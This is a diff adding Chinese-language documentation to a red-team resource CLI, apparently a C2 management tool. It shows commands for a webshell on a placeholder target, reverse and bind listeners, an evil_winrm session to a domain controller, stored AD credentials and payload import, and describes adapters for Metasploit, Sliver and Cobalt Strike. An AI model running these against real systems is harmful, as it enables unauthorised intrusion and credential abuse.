@@ -199,7 +199,24 @@ redtrace-resource webshell-create \
   --name primary --target https://target.example/shell.php \
   --command-param cmd --password-stdin
 redtrace-resource run ws_123 command --command-text id --wait
+
+# Listener 与资源本身是全局的；--project/REDTRACE_PROJECT_ID 只记录来源
+redtrace-resource listener-create --name reverse-01 \
+  --listener-type tcp_reverse --bind-host 0.0.0.0 --bind-port 4444
+redtrace-resource listener-create --name bind-01 \
+  --listener-type tcp_bind --target-host 10.0.0.8 --bind-port 4444
+redtrace-resource session-register --name dc01-winrm --target 10.0.0.8 \
+  --shell-type evil_winrm --connection-type direct --credential cred_123
+printf '%s' "$SECRET_JSON" | redtrace-resource credential-create \
+  --name 'DOMAIN\\alice' --credential-type active_directory --target dc01 --secret-stdin
+redtrace-resource payload-import --name custom-loader --target artifact://payload.exe \
+  --framework custom --format exe
 ```
+
+MSF、Sliver、Cobalt Strike 与自定义 C2 通过同一个 Adapter 合约接入：RedTrace
+轮询 `GET /sessions?framework=...`，向 `POST /execute` 发送会话动作，并向
+`POST /payloads` 请求原生 Payload。Adapter 返回的会话会自动进入全局 C2 会话页；
+Worker 生成的任意文件或引用可直接用 `payload-import` 登记，不要求使用内置生成器。
 
 ### Workspace 上下文
 
